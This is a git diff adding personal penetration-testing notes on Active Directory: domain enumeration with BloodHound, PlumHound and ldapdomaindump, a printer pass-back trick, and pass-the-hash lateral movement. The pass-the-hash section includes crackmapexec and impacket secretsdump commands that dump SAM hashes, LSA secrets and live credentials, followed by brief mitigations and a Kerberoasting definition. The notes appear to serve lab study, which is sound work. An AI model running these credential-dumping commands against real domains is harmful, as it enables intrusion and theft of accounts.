@@ -147,20 +147,82 @@ ntlmrelayx.py -6 -t ldaps://IP -wh path.ashok.local -l lootme # When ever the th
   * Administrative users to protected group via delegation.
 
  ### Initial Attack - Password Attacks
+ [How to Hack Through a Pass-Back Attack: MFP Hacking Guide](https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/)
  - Sometimes the printers have IP set default, change IP to KALI IP address the run the responder to get the hash, netcat on port 389
 
 
-
-
-
-
-
-
-
 ## Post-Compromise Enumeration
+- If you have a valid user account we can move forward.
+- Tools we going to see Bloodhound, Plumhound, Ldapdomaindump, PingCastle, etc.
 
+### Ldapdomaindump - Domain Enumeration 
+- Trying to retrieve the information about the Active Directory similar to bloodhound.
+```powershell
+sudo ldapdomaindump ldaps://IP -u 'domain/username' -p 'password'
+# It will generate .html, and .json extension files.
+```
+### Bloodhound - Domain Enumeration 
+It will try to retrieve data that can give Visualize Active Directory information about Users, groups, and Domain Admins. We can perform trust attacks and relay attacks from Bloodhound.
+```powershell
+#Before that you need to start the neo4j for the Browser session
+sudo neo4j start
+sudo bloodhound
+# Collect the data from the target. ns for nameserver will be Domain Controller.
+sudo bloodhound-python -d domain.local -u username -p password -ns 192.168.138.136  -c all
+# It will generate .json extension files and upload data into Bloodhound GUI to get the structure of Active Directory.
+```
+
+### Plumhound - Domain Enumeration 
+- Link tp [g9thub](https://github.com/PlumHound/PlumHound)  
+- Trying to retrieve the information about the Active Directory in browser view similar to Bloodhound.
+```powershell
+#Installation
+git clone https://github.com/PlumHound/PlumHound
+cd PlumHound
+sudo pip3 install -r requirements.txt
+# Start with tool
+python3 PlumHound.py -ap "domain users@example.com" "domain admins@example.com"
+# Before running this tool should run the neo4j and bloodhound running in the background.
+python3 PlumHound.py --easy -p "Password of neo4j"
+python3 PlumHound.py -x tasks/default.tasks -p "Password of neo4j"
+# Open the index.html in Firefox for interactive view.
+```
+
+### Pingcastle - Domain Enumeration 
+- Free to use some more functionality for paid service.
+- Install the Pincastle.exe with elevated privileges to understand what privileges you have.
 
 ## Post-Compromise Attacks
+- In this section once we have an account to get responder or relay attacks some sort of access, what can we do with the move attack elevate vertically or horizontally.
+
+### Pass the Hash/Password Attacks - Post Compromise 
+- If we crack a password and/or dump the SAM hashes, we can leverage both for lateral movement in networks.
+- We can dump SAM, SYSTEM files using impacket-secrectsdump command.
+- Wdigest is an old authentication protocol up to 2008, 2012 server, you trick the user logging get clear text password using wdigest.
+
+```powershell
+#Some commands for crackmapexec or netexec or nxc 
+crackmapexec smb IP/24 -u user -d ashok.local -p password # Check for Pen3d! to login via wmiexec, psexec
+crackmapexec smb IP/24 -u user -d ashok.local -H LM:NTLM --local-auth
+crackmapexec smb IP/24 -u user -d ashok.local -p password --local-auth --shares
+crackmapexec smb IP/24 -u user -d ashok.local -p password --local-auth --lsa
+crackmapexec smb IP/24 -u user -d ashok.local -p password --local-auth -M lsassy # Dumpout real-time credentials.
+
+# Lab time
+impacket-secrectsdump ashok.local/USERNAME:'PASSWORD'@IP # It will dump a bunch LM:NTLM hashes, LSA secrets, 
+impacket-secrectsdump USERNAME@IP -hashes LM:NTLM
+#Process like llmnr(lateral-wdigest, domain control) -> user hash -> cracked -> sprayed the password -> found new login -> secret dump those logins -> local admin hashes -> respray the network with local accounts.
+```
+- Mitigations
+  * Limit account re-use
+  * Utilize strong passwords > 14
+  * Privilege Access Management (PAM), tools cyber ark process of check-in or checkout period password will expire the attacks will limit.
+ 
+### Kerberoasting Attacks - Post Compromise 
+- An authenticated domain user requests a Kerberos ticket for an SPN. The retrieved Kerberos ticket is encrypted with the hash of the service account password affiliated with the SPN. (An SPN is an attribute that ties a service to a user account within the AD). The adversary then works offline to crack the password hash, often using brute force techniques.
+- 
+
+
 
 
 ## After Compromising Domain -What we can do
